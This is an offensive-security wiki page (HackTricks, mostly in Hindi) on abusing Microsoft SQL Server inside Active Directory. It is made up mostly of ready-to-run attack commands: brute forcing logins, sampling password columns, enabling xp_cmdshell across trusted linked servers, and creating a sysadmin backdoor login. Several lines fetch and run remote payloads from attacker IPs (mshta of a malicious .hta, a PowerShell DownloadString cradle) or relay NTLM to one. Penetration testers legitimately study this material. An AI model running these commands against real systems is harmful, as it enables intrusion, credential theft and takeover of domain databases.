# MSSQL AD Abuse

{{#include ../../banners/hacktricks-training.md}}


## **MSSQL Enumeration / Discovery**

### Python

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) टूल impacket पर आधारित है, और यह kerberos टिकट का उपयोग करके प्रमाणित करने की अनुमति देता है, और लिंक श्रृंखलाओं के माध्यम से हमले करता है

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```
### नेटवर्क से डोमेन सत्र के बिना एन्यूमरेटिंग
```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

````
---
###  Powershell

इस मामले में powershell मॉड्यूल [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) बहुत उपयोगी है।
```bash
Import-Module .\PowerupSQL.psd1
````
### डोमेन सत्र के बिना नेटवर्क से एन्यूमरेट करना
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### डोमेन के अंदर से एन्यूमरेट करना
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

# Try dictionary attack to login
Invoke-SQLAuditWeakLoginPw

# Search SPNs of common software and try the default creds
Get-SQLServerDefaultLoginPw

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL Basic Abuse

### Access DB
```bash
# List databases
Get-SQLInstanceDomain | Get-SQLDatabase

# List tables in a DB you can read
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName

# List columns in a table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName

# Get some sample data from a column in a table (columns username & passwor din the example)
Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10

#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lot of CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

यह MSSQL होस्ट के अंदर **कमांड्स** को निष्पादित करना भी संभव हो सकता है।
```bash
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Check in the page mentioned in the **following section how to do this manually.**

### MSSQL Basic Hacking Tricks

{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## MSSQL Trusted Links

यदि एक MSSQL उदाहरण को एक अलग MSSQL उदाहरण द्वारा विश्वसनीय (डेटाबेस लिंक) माना जाता है। यदि उपयोगकर्ता के पास विश्वसनीय डेटाबेस पर विशेषाधिकार हैं, तो वह **अन्य उदाहरण में क्वेरी निष्पादित करने के लिए विश्वास संबंध का उपयोग करने में सक्षम होगा**। ये विश्वास श्रृंखलाबद्ध किए जा सकते हैं और किसी बिंदु पर उपयोगकर्ता कुछ गलत कॉन्फ़िगर किए गए डेटाबेस को खोजने में सक्षम हो सकता है जहाँ वह कमांड निष्पादित कर सकता है।

**डेटाबेस के बीच के लिंक वन ट्रस्ट के पार भी काम करते हैं।**

### Powershell Abuse
```bash
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
एक और समान उपकरण जो उपयोग किया जा सकता है वह है [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
```bash
SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
# Cobalt Strike
inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
```
### Metasploit

आप मेटास्प्लॉइट का उपयोग करके आसानी से विश्वसनीय लिंक की जांच कर सकते हैं।
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
ध्यान दें कि metasploit केवल MSSQL में `openquery()` फ़ंक्शन का दुरुपयोग करने की कोशिश करेगा (तो, यदि आप `openquery()` के साथ कमांड निष्पादित नहीं कर सकते हैं, तो आपको कमांड निष्पादित करने के लिए `EXECUTE` विधि **हाथ से** आज़मानी होगी, नीचे और देखें।)

### मैनुअल - Openquery()

**Linux** से आप **sqsh** और **mssqlclient.py** के साथ एक MSSQL कंसोल शेल प्राप्त कर सकते हैं।

**Windows** से आप लिंक भी ढूंढ सकते हैं और **MSSQL क्लाइंट जैसे** [**HeidiSQL**](https://www.heidisql.com) का उपयोग करके कमांड को मैन्युअल रूप से निष्पादित कर सकते हैं।

_Windows प्रमाणीकरण का उपयोग करके लॉगिन करें:_

![](<../../images/image (808).png>)

#### विश्वसनीय लिंक खोजें
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../images/image (716).png>)

#### विश्वसनीय लिंक में क्वेरी निष्पादित करें

लिंक के माध्यम से क्वेरी निष्पादित करें (उदाहरण: नए सुलभ उदाहरण में अधिक लिंक खोजें):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
> [!WARNING]
> यह जांचें कि डबल और सिंगल कोट्स कहाँ उपयोग किए गए हैं, उन्हें इस तरह से उपयोग करना महत्वपूर्ण है।

![](<../../images/image (643).png>)

आप इन विश्वसनीय लिंक श्रृंखलाओं को मैन्युअल रूप से हमेशा के लिए जारी रख सकते हैं।
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
यदि आप `openquery()` से `exec xp_cmdshell` जैसी क्रियाएँ नहीं कर सकते हैं, तो `EXECUTE` विधि का प्रयास करें।

### मैनुअल - EXECUTE

आप `EXECUTE` का उपयोग करके विश्वसनीय लिंक का भी दुरुपयोग कर सकते हैं:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## स्थानीय विशेषाधिकार वृद्धि

**MSSQL स्थानीय उपयोगकर्ता** के पास आमतौर पर एक विशेष प्रकार का विशेषाधिकार होता है जिसे **`SeImpersonatePrivilege`** कहा जाता है। यह खाते को "प्रमाणीकरण के बाद एक ग्राहक का अनुकरण करने" की अनुमति देता है।

कई लेखकों द्वारा विकसित एक रणनीति यह है कि एक SYSTEM सेवा को एक धोखाधड़ी या मैन-इन-द-मिडल सेवा के लिए प्रमाणीकरण करने के लिए मजबूर किया जाए जिसे हमलावर बनाता है। यह धोखाधड़ी सेवा तब SYSTEM सेवा का अनुकरण कर सकती है जबकि यह प्रमाणीकरण करने की कोशिश कर रही है।

[SweetPotato](https://github.com/CCob/SweetPotato) के पास इन विभिन्न तकनीकों का एक संग्रह है जिसे Beacon के `execute-assembly` कमांड के माध्यम से निष्पादित किया जा सकता है।

### SCCM प्रबंधन बिंदु NTLM रिले (OSD गुप्त निष्कर्षण)
देखें कि SCCM **प्रबंधन बिंदुओं** की डिफ़ॉल्ट SQL भूमिकाओं का उपयोग नेटवर्क एक्सेस खाता और कार्य-क्रम गुप्तों को सीधे साइट डेटाबेस से डंप करने के लिए कैसे किया जा सकता है:
{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
